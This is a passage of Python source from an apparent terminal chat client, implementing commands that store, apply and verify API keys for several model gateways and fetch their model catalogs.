            return "/nvidia-api-setup <nvapi- key>"
        return f"/{src.key}-api-setup <key>"

    def _probe_direct(self, src, route, chosen: str, token: str | None):
        """``(model, replaced, ok, detail)`` for a direct route. Blocking.

        Runs on the worker thread: it makes two network calls (the Models route
        and, for the free lineups, the catalog the fallback is picked from) and
        touches no widget.
        """
        from .. import openai_compat as oa_mod

        if src.key == "nvidia":
            # NVIDIA's Models route is PUBLIC — it answers 200 with no key and
            # with a wrong one — so probing it would call a rejected key
            # healthy and let the switch land on a route that 401s on the first
            # turn. verify_key makes one tiny real call instead, which is the
            # only thing that proves the credential. Its catalog is read from
            # this module's own cache for the same reason /model is: the ids
            # offered must be the chat-capable ones, not the raw 83.
            ok, detail = nv_mod.verify_key(token or "", chosen)
            ids = list(nv_mod.model_ids(token or "")[0] or [])
        else:
            ok, detail = oa_mod.probe(route.base_url, token)
            ids = list(oa_mod.cached_ids(route.base_url))
        if not ids or chosen in ids:
            return chosen, None, ok, detail
        declared = route.upstream_model(src.model)
        if declared in ids:
            return declared, chosen, ok, detail
        # Neither the stored name nor the declared default survives: the lineup
        # moved. Prefer whatever is free right now over leaving a paid name in
        # place that the account may not be funded for.
        mod = {"iteracompute": ic_mod, "infronai": inf_mod,
               "nvidia": nv_mod}.get(src.key)
        if mod is not None:
            try:
                fresh = mod.default_free_model()
            except Exception:  # noqa: BLE001 - a fallback must not fail the switch
                fresh = None
            if fresh and fresh in ids:
                return fresh, chosen, ok, detail
        return ids[0], chosen, ok, detail

    async def _verify_model_for(self, src, name: str) -> tuple[str, str | None]:
        """``(model_to_use, replaced_name_or_None)`` for a just-started source.

        Logfare, IteraCompute and InfronAI all publish a catalog, and all have a
        local proxy whose profile can go stale — the free-tier ones more so,
        because the lineup they serve turns over. A fetch that fails leaves the
        stored name alone: an unreachable catalog is not evidence that a model
        was retired, and refusing to switch on it would be worse than the 404
        it is trying to prevent.
        """
        if src.key in ("iteracompute", "infronai"):
            # The catalog, not the health feed: this is what says which ids the
            # proxy can actually forward. `model_ids` drops image entries, and
            # for InfronAI also the Responses-only ones, so a switch cannot land
            # on something the Chat Completions proxy would refuse.
            mod = ic_mod if src.key == "iteracompute" else inf_mod
            ids, _ = await asyncio.to_thread(mod.model_ids)
            if not ids:
                return name, None
            if name in ids:
                return name, None
            if src.model in ids:
                return src.model, name
            # Neither the stored name nor the declared default survives: the
            # free lineup moved. Prefer whatever is free right now over leaving
            # a paid name in place that the account may not be funded for.
            fresh = await asyncio.to_thread(mod.default_free_model)
            if fresh:
                return fresh, name
            return name, None
        if src.key != "logfare":
            return name, None
        models, _ = await asyncio.to_thread(lf_mod.fetch_models)
        if not models:
            return name, None
        served = {m.id for m in models}
        if name in served:
            return name, None
        # The declared default is the fallback, not the current name: it is the
        # one string guaranteed to be both in the table and in the catalog.
        if src.model in served:
            return src.model, name
        return name, None

    # ---- TokenHarbour ----------------------------------------------------
    # A hosted Anthropic-protocol gateway, not a local proxy: the key is set by
    # the operator (/tokenharbour-api-setup) rather than discovered in a shipped
    # profile, and the catalog is fetched live rather than declared in a table.
    def _cmd_tokenharbour_key(self, args) -> None:
        """/tokenharbour-api-setup {key} — store the TokenHarbour API key.

        Written to ~/.zimzilla/tokenharbour/source, mode 600, in the same
        profile format every other source uses. The key is never echoed back —
        the confirmation names the file and the last four characters, which is
        enough to tell two keys apart and not enough to leak one.
        """
        p = self.palette
        if not args:
            creds = th_mod.load_credentials()
            t = Text()
            t.append("  TOKENHARBOUR API KEY\n\n", style=f"bold {p.accent}")
            if creds is None:
                t.append("  no key set.\n\n", style=p.amber)
            else:
                _, _, origin = creds
                t.append("  source: ", style=p.dim)
                t.append(origin + "\n\n", style=p.primary)
            t.append("  set it with  ", style=p.dim)
            t.append("/tokenharbour-api-setup <key>\n", style=f"bold {p.primary}")
            t.append("  get a key at  ", style=p.dim)
            t.append("https://tokenharbor.ai\n", style=p.primary)
            t.append(f"  stored in     {th_mod.PROFILE}\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        key = args[0].strip()
        if not th_mod.looks_like_key(key):
            self._sys_line(
                "that does not look like an API key — paste just the key, "
                "not the whole `export` line", warn=True)
            return

        # Keep whatever model is current, so setting a key does not silently
        # reset the model the operator was on.
        current = self.cfg.model if th_mod.is_tokenharbour(self.cfg.base_url) else ""
        path = th_mod.save_key(key, current)
        th_mod.clear_cache()          # a new key invalidates the old catalog
        # The key has to take effect in THIS process, not just on disk. The
        # environment holds whatever the shell that launched ZimZilla exported,
        # and it was winning every lookup — so a key set here was written,
        # confirmed, and then never sent, leaving the session on the previous
        # credential until it was restarted. remember_session_key makes the
        # typed key beat that stale snapshot.
        th_mod.remember_session_key(key)
        # ...and if the session is already on TokenHarbour, the live client and
        # cfg still hold the old credential. Rebuilding them here is the
        # difference between "saved" and "working".
        on_tokenharbour = th_mod.is_tokenharbour(self.cfg.base_url)
        if on_tokenharbour:
            th_mod.apply_to(self.cfg)
            self.agent._client = None
        tail = key[-4:]
        self._sys_line(f"TokenHarbour key saved (…{tail}) to {path}", ok=True)
        if on_tokenharbour:
            self._sys_line("live session now uses the new key", ok=True)
        else:
            self._sys_line("switch to it with /zim-tokenharbour", )

    def _cmd_tokenharbour_models(self, args) -> None:
        """/tokenharbour-models — fetch the catalog and show what is free, now.

        Runs the fetch off the UI thread so a slow gateway cannot freeze the
        session, then warms the cache /model reads from.
        """
        creds = th_mod.load_credentials()
        if creds is None:
            self._sys_line(
                "no TokenHarbour key — set one with /tokenharbour-api-setup <key>",
                warn=True)
            return
        token, _, origin = creds
        self._sys_line(f"fetching the TokenHarbour catalog ({origin})…")
        self._fetch_tokenharbour_models(token)

    @work(exclusive=True, thread=True)
    def _fetch_tokenharbour_models(self, token: str) -> None:
        """The blocking fetch, off the UI thread, then a call back on it."""
        models, err = th_mod.fetch_models(token)
        self.call_from_thread(self._show_tokenharbour_models, models, err)

    def _show_tokenharbour_models(self, models, err: str) -> None:
        p = self.palette
        if models is None:
            self._sys_line(f"TokenHarbour: {err}", warn=True)
            return
        free = [m for m in models if m.free]
        t = Text()
        t.append("  TOKENHARBOUR — FREE MODELS\n\n", style=f"bold {p.accent}")
        if not free:
            t.append("  nothing is free right now.\n", style=p.amber)
            t.append(f"  {len(models)} models are served, none at zero cost.\n",
                     style=p.dim)
        else:
            for m in free:
                mark = "◉" if m.id == self.cfg.model else "○"
                style = f"bold {p.accent}" if m.id == self.cfg.model else p.primary
                t.append(f"  {mark} {m.id:<26}", style=style)
                t.append(m.blurb + "\n", style=p.dim)
            t.append("\n  pick one with  ", style=p.dim)
            t.append("/model <name>\n", style=f"bold {p.primary}")
        t.append(f"  {len(models)} models served in total · "
                 "see them all with /model\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)
        # The transcript is not a picker: offer the free ones as the live list
        # /model reads, so the two commands agree.
        self._refresh_model_choices()

    # ---- logfare catalog --------------------------------------------------
    def _cmd_logfare_models(self, args) -> None:
        """/logfare-models — fetch Logfare's live catalog and show what is up.

        The status API is public, so this needs no key and works before the
        operator has authenticated anything. That is also why it is the one
        catalog that can be warmed at startup.
        """
        self._sys_line("fetching the Logfare catalog…")
        self._fetch_logfare_models()

    @work(exclusive=True, thread=True)
    def _fetch_logfare_models(self) -> None:
        """The blocking fetch, off the UI thread, then a call back on it."""
        models, err = lf_mod.fetch_models()
        self.call_from_thread(self._show_logfare_models, models, err)

    @work(exclusive=True, thread=True)
    def _warm_logfare_catalog(self) -> None:
        """Fetch the catalog once at startup, silently.

        Deliberately says nothing, on success or failure: a launch that cannot
        reach the status API is still a working launch — /model falls back to
        the declared list and says so, and /logfare-models reports the failure
        on demand. A catalog that is merely *fresh* is not news.
        """
        lf_mod.fetch_models()

    @work(exclusive=True, thread=True)
    def _warm_iteracompute_catalog(self) -> None:
        """Fetch IteraCompute's catalog once at startup, silently.

        Silent for the same reason the Logfare warm-up is: a launch that cannot
        reach the public catalog is still a working launch, /model falls back to
        the declared list, and /iteracompute-models reports the failure on
        demand. A catalog that is merely fresh is not news.
        """
        creds = ic_mod.load_credentials()
        ic_mod.fetch_models(creds[0] if creds else "")

    @work(exclusive=True, thread=True)
    def _warm_infronai_catalog(self) -> None:
        """Fetch InfronAI's catalog once at startup, silently.

        Silent for the same reason the other two warm-ups are: a launch that
        cannot reach the public catalog is still a working launch, /model falls
        back to the declared list, and /infronai-models reports the failure on
        demand. A catalog that is merely fresh is not news.
        """
        creds = inf_mod.load_credentials()
        inf_mod.fetch_models(creds[0] if creds else "")

    @work(exclusive=True, thread=True)
    def _warm_nvidia_catalog(self) -> None:
        """Fetch NVIDIA's catalog once at startup, silently.

        Silent for the same reason the other warm-ups are: a launch that cannot
        reach the public catalog is still a working launch, /model falls back to
        the declared list, and /nvidia-models reports the failure on demand. A
        catalog that is merely fresh is not news.
        """
        creds = nv_mod.load_credentials()
        nv_mod.fetch_models(creds[0] if creds else "")

    def _show_logfare_models(self, models, err: str) -> None:
        p = self.palette
        if models is None:
            self._sys_line(f"Logfare: {err}", warn=True)
            return
        t = Text()
        t.append("  LOGFARE — LIVE MODELS\n\n", style=f"bold {p.accent}")
        if not models:
            t.append("  Logfare is serving no chat models right now.\n",
                     style=p.amber)
        else:
            for m in models:
                mark = "◉" if m.id == self.cfg.model else "○"
                style = f"bold {p.accent}" if m.id == self.cfg.model else p.primary
                t.append(f"  {mark} {m.id:<26}", style=style)
                # A degraded model is flagged in amber rather than dim: it is
                # the one thing on this screen worth noticing.
                t.append(m.blurb + "\n", style=p.dim if m.healthy else p.amber)
            t.append("\n  pick one with  ", style=p.dim)
            t.append("/model <name>\n", style=f"bold {p.primary}")
        t.append(f"  {len(models)} chat models served · fetched from "
                 f"{lf_mod.HOST}{lf_mod.STATUS_PATH}\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)
        # The popup and /model both read the cache this fetch just warmed.
        self._refresh_model_choices()

    def _cmd_zim_tokenharbour(self, args) -> None:
        """/zim-tokenharbour — repoint the session at the hosted gateway.

        Unlike /zim-logfare there is no local proxy to start and no shipped
        profile: the key comes from wherever the operator put it
        — the environment (a sourced ~/claude-source profile), ZimZilla's own
        profile, or a ~/claude-source file — and the model defaults to a free
        one so a fresh switch costs nothing.
        """
        creds = th_mod.load_credentials()
        if creds is None:
            self._sys_line(
                "no TokenHarbour key found. Set one with "
                "/tokenharbour-api-setup <key>, or source a profile first "
                "(source ~/claude-source/haiku-5.5)", warn=True)
            return

        token, model, origin = creds
        if sources_mod.active_key(self.cfg.base_url) == "tokenharbour":
            # Already pointed here — most often because a profile was sourced
            # before launch. Record it anyway: the environment does not survive
            # the next launch, and the whole point of the selection file is that
            # the choice does.
            #
            # Re-apply rather than just record. "Already on the host" says
            # nothing about *which credential* is live: a key saved with
            # /tokenharbour-api-setup since launch, or a profile sourced before
            # it, leaves cfg holding the older token, and this branch used to
            # return here leaving the session on it. Applying is idempotent
            # when nothing changed, so it costs nothing in the common case.
            th_mod.apply_to(self.cfg)
            self.agent._client = None
            th_mod.set_current("tokenharbour")
            self._sys_line(f"already on TokenHarbour ({origin})", ok=True)
            return

        applied = th_mod.apply_to(self.cfg)
        if applied is None:            # unreachable: creds was just checked
            self._sys_line("no TokenHarbour key found", warn=True)
            return
        origin, model = applied
        self.agent._client = None      # rebuild against the new host
        th_mod.set_current("tokenharbour")
        self._refresh_after_source_change("TokenHarbour", f"key from {origin}")

        # A first switch with no model chosen lands on whatever the profile
        # named; with none, offer the free list rather than guessing a paid one.
        if not model:
            self._sys_line("fetching the free model list…")
            self._fetch_tokenharbour_models(token)

    # ---- hosted gateway: OpenRouter ---------------------------------------
    #
    # The same shape of thing as TokenHarbour — a remote endpoint speaking the
    # Anthropic protocol, with a credential the operator *sets* rather than one
    # the launcher discovers — so the commands it needs are written once here,
    # parameterised by kind. TokenHarbour keeps its own originals because it
    # predates this and its transcript wording is referenced elsewhere.

    def _gateway(self, kind: str):
        """``(module, label)`` for a hosted gateway key. ``None`` if unknown.

        AntSeed is included although it is not a *hosted* gateway and has no
        key: it answers the same calls this table exists to parameterise
        (``load_credentials``, ``apply_to``, ``set_current``, ``active_endpoint``),
        so listing it here is what lets ``/zim-antseed`` share one code path
        with the other two instead of growing a near-copy of it.
        """
        if kind == "openrouter":
            return or_mod, "OpenRouter"
        if kind == "unorouter":
            return uno_mod, "UnoRouter"
        if kind == "aihubmix":
            return ah_mod, "AIHubMix"
        if kind == "beatapi":
            return bp_mod, "BeatAPI"
        # Not a hosted gateway: IteraCompute has no Messages endpoint, so it is
        # a local proxy source — `/zim-iteracompute` goes through
        # `_cmd_zim_source` like Logfare, and (since the harness speaks Chat
        # Completions) lands on the upstream directly rather than on the proxy.
        # It is listed here so `/iteracompute-api-setup` can share the
        # key-handling code, which is the same read/write against a mode-600
        # profile.
        if kind == "iteracompute":
            return ic_mod, "IteraCompute"
        # Same case again: a local proxy, so `/zim-infronai` goes through
        # `_cmd_zim_source`. Listed here for the key command alone.
        if kind == "infronai":
            return inf_mod, "InfronAI"
        # Direct-only, like Token Juice: reached over Chat Completions with no
        # proxy, so `/zim-nvidia` goes through `_cmd_zim_source`. Listed here so
        # `/nvidia-api-setup` shares the key-handling code — the same read/write
        # against a mode-600 profile.
        if kind == "nvidia":
            return nv_mod, "NVIDIA NIM"
        if kind == "antseed":
            return as_mod, "AntSeed"
        return None

    def _cmd_logfare_key(self, args) -> None:
        """/logfare-api-setup [key] — use your own Logfare key.

        No Logfare key ships in this repository, so this is where the first one
        comes from. It goes to ``~/.zimzilla/logfare/source``, mode 600, which
        the launcher, ``/zim-logfare`` and the proxy all read. Logfare applies a
        per-account budget — 20/min, 500/hour, 2500/day, three concurrent, then
        a 429 with a Retry-After until the UTC day rolls over — and a second key
        is a second budget.

        Nothing is echoed. The confirmation names the last four characters,
        which tells two keys apart and is not enough to be one.
        """
        p = self.palette
        if not args:
            creds = lf_mod.load_credentials()
            t = Text()
            t.append("  LOGFARE API KEY\n\n", style=f"bold {p.accent}")
            if creds is None:
                t.append("  no key found.\n\n", style=p.amber)
                t.append("  get one at    ", style=p.dim)
                t.append("https://logfare.ai", style=p.primary)
                t.append("  (they start with lfu_)\n\n", style=p.dim)
            else:
                token, _, origin = creds
                shared = str(origin) == str(lf_mod.SHIPPED_PROFILE)
                t.append("  in use   ", style=p.dim)
                t.append(f"…{token[-4:]}  ", style=p.primary)
                t.append("shared by every install\n" if shared else "yours\n",
                         style=p.amber if shared else p.accent)
                t.append("  from     ", style=p.dim)
                t.append(origin + "\n", style=p.primary)
                if shared:
                    t.append("  one budget for all of them: ", style=p.dim)
                    t.append(
                        "20/min, 500/hour, 2500/day, 3 concurrent,\n"
                        "  then a 429 until the UTC day rolls over.\n", style=p.dim)
                    t.append("  your own key lifts that: ", style=p.dim)
                    t.append("https://logfare.ai\n", style=p.primary)
            t.append("\n  set it with  ", style=p.dim)
            t.append("/logfare-api-setup <key>\n", style=f"bold {p.primary}")
            t.append(f"  stored in     {lf_mod.PROFILE}\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        key = str(args[0]).strip()
        if not lf_mod.looks_like_key(key):
            self._sys_line(
                "that does not look like an API key — paste just the key, "
                "not the whole `export` line", warn=True)
            return
        if not key.startswith(lf_mod.KEY_PREFIX):
            # A hint, not a refusal: a real key of an unexpected shape is worth
            # more stored than rejected, and a wrong key only costs one 401.
            self._sys_line(
                f"Logfare keys start with {lf_mod.KEY_PREFIX!r} — storing this "
                "one anyway", warn=True)

        direct = lf_mod.is_logfare(self.cfg.base_url)
        live = direct or lf_mod.active_endpoint(self.cfg.base_url)
        # Keep the model the session is on: setting a key is not a model choice.
        path = lf_mod.save_key(key, self.cfg.model if live else "")
        lf_mod.clear_cache()          # a new key means a new quota, refetch
        self._sys_line(f"Logfare key saved (…{key[-4:]}) to {path}", ok=True)
        if direct:
            # Talking to logfare.ai itself: this client sends the key, so it is
            # in force as soon as the client is rebuilt.
            self.cfg.auth_token = key
            self.cfg.api_key = ""
            self.agent._client = None
            self._sys_line("applied to this session — no restart", ok=True)
        elif live:
            # Through the local proxy: LiteLLM took its master key and its
            # upstream key from the profile at start-up, so a restart with the
            # new environment is the only way the new key becomes the key in use.
            src = sources_mod.discover().get("logfare")
            if src is None:
                self._sys_line("no Logfare service to restart — the key applies "
                               "on the next launch", warn=True)
            else:
                self._restart_proxy_for_key(src, key)
        else:
            self._sys_line("switch to it with /zim-logfare")

    @work(exclusive=True)
    async def _restart_proxy_for_key(self, src, key: str) -> None:
        """Restart a source's proxy so it comes up holding the key just written."""
        bar = self.query_one(StatusBar)
        self.busy = True
        bar.set_activity(f"restarting {src.label} proxy", busy=True)
        self._sys_line(f"restarting the {src.label} proxy so it uses the new key…")
        try:
            ok, detail = await asyncio.to_thread(sources_mod.restart_proxy, src)
        finally:
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self.query_one("#input", Input).focus()
        if not ok:
            self._sys_line(f"proxy restart failed: {detail}", warn=True)
            self._sys_line("the key is saved — it applies on the next launch", warn=True)
            return
        # The proxy's master key is the new key now, so this client has to send
        # it or every request is a 401 against the proxy rather than upstream.
        self.cfg.auth_token = key
        self.cfg.api_key = ""
        self.agent._client = None
        self._sys_line(f"{src.label} proxy restarted — the new key is live", ok=True)

    def _cmd_tokenjuice_key(self, args) -> None:
        """/tokenjuice-api-setup [key|clear] — your own Token Juice key.

        The shared key in the tree (``packaging/tokenjuice/source``) is what
        makes a fresh clone work with no signup, and it is deliberately
        committed. **This command never touches it.** A personal key goes to
        ``$ZIMZILLA_HOME/tokenjuice/source`` — mode 600, the same
        ``export VAR="value"`` format as every other profile — which the
        discovery chain reads first, so replacing the shared key locally needs
        no repository change. ``clear`` removes only that personal file and the
        shared key takes over again.

        The key is never echoed: the confirmation names the file and the last
        four characters, enough to tell one key from another and not enough to
        be one. Same rule as every other ``/<source>-api-setup``.

        ``/zim-tokenjuice <key>`` remains the one-step "set it and switch"; this
        command is the setup half on its own, so a key can be replaced while the
        session is on a different route without repointing it.
        """
        p = self.palette
        word = str(args[0]).strip() if args else ""

        if not word or word.lower() in ("status", "show"):
            st = sources_mod.tokenjuice_status()
            t = Text()
            t.append("  TOKEN JUICE KEY\n\n", style=f"bold {p.accent}")
            t.append("  in force     ", style=p.dim)
            if not st.origin:
                t.append("nothing found\n", style=p.amber)
            else:
                label = {
                    "personal": "your own key",
                    "legacy": "your key (older layout)",
                    "shipped": "the shared key",
                }.get(st.origin, st.origin)
                t.append(f"{label}  ····{st.tail}\n", style=p.primary)
                t.append("  from         ", style=p.dim)
                t.append(f"{st.path}\n", style=p.dim)
            if st.base_url:
                t.append("  upstream     ", style=p.dim)
                t.append(st.base_url + "\n", style=p.primary)
            if st.model:
                t.append("  model        ", style=p.dim)
                t.append(st.model + "\n", style=p.primary)
            t.append("\n  the shared key is public by design — every clone "
                     "spends it.\n", style=p.dim)
            t.append("  a personal key replaces it locally and is read "
                     "first.\n\n", style=p.dim)
            t.append("  set it with    ", style=p.dim)
            t.append("/tokenjuice-api-setup tj_…\n", style=f"bold {p.primary}")
            t.append("  fall back to the shared one with  ", style=p.dim)
            t.append("/tokenjuice-api-setup clear\n", style=f"bold {p.primary}")
            t.append("  stored in      ", style=p.dim)
            t.append(f"{sources_mod.tokenjuice_profile()}  (mode 600)\n",
                     style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        if word.lower() in ("clear", "reset", "shared", "default"):
            try:
                removed = sources_mod.clear_token()
            except OSError as e:
                self._sys_line(
                    f"could not remove the personal Token Juice profile: {e}",
                    warn=True)
                return
            if removed is None:
                self._sys_line(
                    "no personal key to clear — the shared key is already in "
                    "force")
            else:
                self._sys_line(
                    f"removed {removed} — the shared key is in force again",
                    ok=True)
            # The client holds the token it read at switch time, so a clear on
            # the live route has to reload it or the old key stays in memory
            # until the next launch — the "saved but not in force" failure the
            # NVIDIA command documents.
            if sources_mod.active_key(self.cfg.base_url) == "tokenjuice":
                src = sources_mod.discover().get("tokenjuice")
                env = sources_mod.load_profile(src) if src is not None else {}
                self.cfg.auth_token = env.get("ANTHROPIC_AUTH_TOKEN") or None
                self.cfg.api_key = env.get("ANTHROPIC_API_KEY") or ""
                self.agent._client = None
                self._sys_line("applied to this session — no restart", ok=True)
            else:
                self._sys_line(
                    "the route is not Token Juice right now — /zim-tokenjuice "
                    "to switch")
            self._sys_line(
                "the shipped key was not touched — it stays public in the tree")
            return

        if not sources_mod.is_tokenjuice_key(word):
            self._sys_line(
                "that does not look like a Token Juice key — paste just the "
                "tj_ key, not the whole `export` line", warn=True)
            return
        try:
            path = sources_mod.save_token(word)
        except OSError as e:
            self._sys_line(f"could not save the Token Juice key: {e}", warn=True)
            return
        self._sys_line(
            f"Token Juice key saved (…{word[-4:]}) to {path} (mode 600)", ok=True)
        if sources_mod.active_key(self.cfg.base_url) == "tokenjuice":
            self.cfg.auth_token = word
            self.cfg.api_key = ""
            self.agent._client = None
            self._sys_line("applied to this session — no restart", ok=True)
        else:
            self._sys_line("switch to it with /zim-tokenjuice")
        self._sys_line(
            "the shared key in the tree was not modified — it stays public")

    def _cmd_gateway_key(self, kind: str, args) -> None:
        """/openrouter-api-setup and /unorouter-api-setup [key] — store the key.

        Parameterised by *kind* so both hosted gateways share one
        implementation rather than growing a near-copy each.

        Written to ~/.zimzilla/<kind>/source, mode 600, in the same
        ``export VAR="value"`` format every other profile uses — so it can be
        sourced by a shell as well as read by the harness, and there is one
        credential format in the project rather than three.

        The key is never echoed. The confirmation names the file and the last
        four characters, which is enough to tell one key from another and not
        enough to be one.
        """
        found = self._gateway(kind)
        if found is None:
            self._sys_line(f"unknown gateway: {kind}", warn=True)
            return
        mod, label = found
        p = self.palette

        if not args:
            creds = mod.load_credentials()
            t = Text()
            t.append(f"  {label.upper()} API KEY\n\n", style=f"bold {p.accent}")
            if creds is None:
                t.append("  no key set.\n\n", style=p.amber)
            else:
                _, _, origin = creds
                t.append("  source: ", style=p.dim)
                t.append(origin + "\n\n", style=p.primary)
            if kind == "antseed":
                # There is no key to set, and offering a key box for a service
                # that authenticates nothing would be a lie the operator only
                # discovers by pasting one into it. Say what is actually needed.
                t.append("  nothing to set — ", style=p.dim)
                t.append(
                    "the local buyer proxy takes no credential.\n"
                    "  start it with ", style=p.dim)
                t.append("antseed buyer start\n", style=f"bold {p.primary}")
                t.append("  then switch with ", style=p.dim)
                t.append("/zim-antseed\n", style=f"bold {p.primary}")
                t.append(f"  preference   {mod.PROFILE}\n", style=p.dim)
                self.query_one(ChatPane).write_block(t)
                return
            t.append("  set it with  ", style=p.dim)
            t.append(f"/{kind}-api-setup <key>\n", style=f"bold {p.primary}")
            if kind in ("openrouter", "unorouter", "aihubmix", "beatapi",
                        "iteracompute", "infronai", "nvidia"):
                # Worth saying plainly: this catalog is public, so the free list
                # and a model choice work before any key exists. The key is only
                # needed to actually send a message.
                t.append("  note:        ", style=p.dim)
                t.append(
                    "the model catalog is public — /models works without a key. "
                    "A key is needed to send.\n",
                    style=p.dim,
                )
            if kind == "nvidia":
                t.append("  get a key at  ", style=p.dim)
                t.append("https://build.nvidia.com\n", style=p.primary)
                t.append("  keys start    ", style=p.dim)
                t.append(f"{mod.KEY_PREFIX}  · free developer tier, ~40 req/min\n",
                         style=p.dim)
            t.append(f"  stored in     {mod.PROFILE}\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        key = args[0].strip()
        if not mod.looks_like_key(key):
            self._sys_line(
                "that does not look like an API key — paste just the key, "
                "not the whole `export` line", warn=True)
            return

        # Keep whatever model is current, so setting a key does not silently
        # reset the model the operator was on.
        current = self.cfg.model if mod.active_endpoint(self.cfg.base_url) else ""
        path = mod.save_key(key, current)
        mod.clear_cache()             # a new key invalidates the old catalog
        self._sys_line(f"{label} key saved (…{key[-4:]}) to {path}", ok=True)
        if kind == "nvidia" and nv_mod.is_nvidia(self.cfg.base_url):
            # The route is direct and the client already holds the *old* token,
            # which it read from the profile at switch time. Without this the
            # new key is on disk and nowhere else until the next launch — the
            # "saved but not in force" failure TokenHarbour's command documents.
            self.cfg.auth_token = key
            self.cfg.api_key = ""
            self.agent._client = None
            self._sys_line("applied to this session — no restart", ok=True)
            return
        self._sys_line(f"switch to it with /zim-{kind}")

    def _cmd_ldxhub_key(self, args) -> None:
        """/ldxhub-api-setup [key] — store the LDXHub key for document jobs.

        Unlike every other *-api-setup command there is nothing to switch to
        afterwards: LDXHub has no Messages endpoint, so it can never become
        this session's upstream. The key unlocks the six document tools and
        their job endpoints; the model/engine catalogs are public and already
        listable via /ldxhub-models.

        Written to ~/.zimzilla/ldxhub/source, mode 600, same
        ``export VAR="value"`` format as every other profile. The key is
        never echoed — the confirmation names the file and the last four
        characters, enough to tell one key from another, not enough to be one.
        """
        p = self.palette

        if not args:
            creds = ldx_mod.load_credentials()
            t = Text()
            t.append("  LDXHUB API KEY\n\n", style=f"bold {p.accent}")
            if creds is None:
                t.append("  no key set.\n\n", style=p.amber)
            else:
                _, _, origin = creds
                t.append("  source: ", style=p.dim)
                t.append(origin + "\n\n", style=p.primary)
            t.append("  set it with  ", style=p.dim)
            t.append("/ldxhub-api-setup <key>\n", style=f"bold {p.primary}")
            t.append("  note:        ", style=p.dim)
            t.append(
                "the model/engine catalogs are public — /ldxhub-models works "
                "without a key.\n"
                "               A key is needed to run a document job "
                "(the ldxhub_* tools).\n", style=p.dim)
            t.append(f"  stored in     {ldx_mod.PROFILE}\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        key = args[0].strip()
        if not ldx_mod.looks_like_key(key):
            self._sys_line(
                "that does not look like an API key — paste just the key, "
                "not the whole `export` line", warn=True)
            return
        path = ldx_mod.save_key(key)
        ldx_mod.clear_cache()           # a new key invalidates the old catalog
        self._sys_line(f"LDXHub key saved (...{key[-4:]}) to {path}", ok=True)
        self._sys_line(
            "the ldxhub_* tools are available now — /ldxhub-models "
            "to pin a per-service default")

    def _cmd_ldxhub_models(self, args) -> None:
        """/ldxhub-models [service [entry]] — LDXHub's per-service catalogs.

        Unlike every other *-models command this one is not a chat model
        list: LDXHub has no Messages endpoint, so there is nothing here to
        put in /model. The catalogs are still worth browsing and pinning —
        the six agent tools each take a model or engine from the matching
        service, and the pin is what a tool omits when the operator does
        not name one.

        Catalogs are public, so a missing key does not block listing; only
        *pinning* a default needs the key profile to write into.
        """
        service = (args[0].strip().lower() if args else "")
        if service and service not in ldx_mod.SERVICES:
            self._sys_line(
                f"unknown LDXHub service: {service} — try one of "
                f"{', '.join(ldx_mod.SERVICES)}", warn=True)
            return
        if len(args) >= 2:
            entry_id = args[1].strip()
            path = ldx_mod.save_default(service, entry_id)
            if path is None:
                self._sys_line(
                    "no LDXHub key profile to write the default into — "
                    "set a key with /ldxhub-api-setup", warn=True)
                return
            self._sys_line(f"{service} default set to {entry_id}", ok=True)
        self._sys_line(
            f"fetching the LDXHub {service or 'service'} catalog...")
        self._fetch_ldxhub_models(service)

    @work(exclusive=True, thread=True)
    def _fetch_ldxhub_models(self, service: str) -> None:
        """Fetch catalogs off the UI thread, then hand back to it.

        Six sequential fetches worst-case; each is public and cached for
        five minutes, so a second listing in the same session is instant.
        """
        creds = ldx_mod.load_credentials()
        token = creds[0] if creds else ""
        defaults = dict(creds[1]) if creds else {}
        wanted = [service] if service else list(ldx_mod.SERVICES)
        rows: list[tuple[str, list | None]] = []
        err: str | None = None
        for svc in wanted:
            entries, e = ldx_mod.fetch_catalog(svc, token)
            if entries is None:
                err = err or f"{svc}: {e}"
                rows.append((svc, None))
            else:
                rows.append((svc, entries))
        self.call_from_thread(
            self._show_ldxhub_models, rows, err, defaults)

    def _show_ldxhub_models(
            self,
            rows: list[tuple[str, list | None]],
            err: str | None,
            defaults: dict[str, str]) -> None:
        p = self.palette
        t = Text()
        t.append("  LDXHUB CATALOGS\n\n", style=f"bold {p.accent}")
        for svc, entries in rows:
            kind = ldx_mod.SERVICES[svc]
            t.append(f"  {svc} ", style=f"bold {p.primary}")
            t.append(f"({kind})\n", style=p.dim)
            if entries is None:
                t.append("    unavailable\n", style=p.amber)
                continue
            if not entries:
                t.append("    (empty)\n", style=p.dim)
                continue
            pin = (defaults.get(svc) or "").strip()
            for e in entries:
                mark = "*" if pin and e.id == pin else " "
                t.append(f"    {mark} {e.id:<28}", style=p.primary)
                t.append(e.summary + "\n", style=p.dim)
        t.append("\n  pin a default:  ", style=p.dim)
        t.append("/ldxhub-models <service> <id>\n", style=f"bold {p.primary}")
        t.append("  * marks the profile default the tools fall back to.\n",
                 style=p.dim)
        t.append("  a key is only needed to run a job, not to browse — "
                 "/ldxhub-api-setup\n", style=p.dim)
        if err:
            t.append(f"  note: {err}\n", style=p.amber)
        self.query_one(ChatPane).write_block(t)

    def _cmd_zim_gateway(self, kind: str) -> None:
        """/zim-openrouter — repoint the session at the gateway.

        No local proxy to start and no shipped profile: the key comes from
        wherever the operator put it — the environment (a sourced
        ~/claude-source profile), ZimZilla's own profile, or a ~/claude-source
        file — and the model defaults to a free one so a fresh switch costs
        nothing.
        """
        found = self._gateway(kind)
        if found is None:
            self._sys_line(f"unknown gateway: {kind}", warn=True)
            return
        mod, label = found

        creds = mod.load_credentials()
        if creds is None:
            self._sys_line(
                f"no {label} key found. Set one with /{kind}-api-setup <key>, "
                "or source a profile first", warn=True)
            return

        token, model, origin = creds
        if sources_mod.active_key(self.cfg.base_url) == kind:
            # Already pointed here — most often because a profile was sourced
            # before launch. Record it anyway: the environment does not survive
            # the next launch, and the whole point of the selection file is that
            # the choice does.
            mod.set_current(kind)
            self._sys_line(f"already on {label} ({origin})", ok=True)
            return

        applied = mod.apply_to(self.cfg)
        if applied is None:            # unreachable: creds was just checked
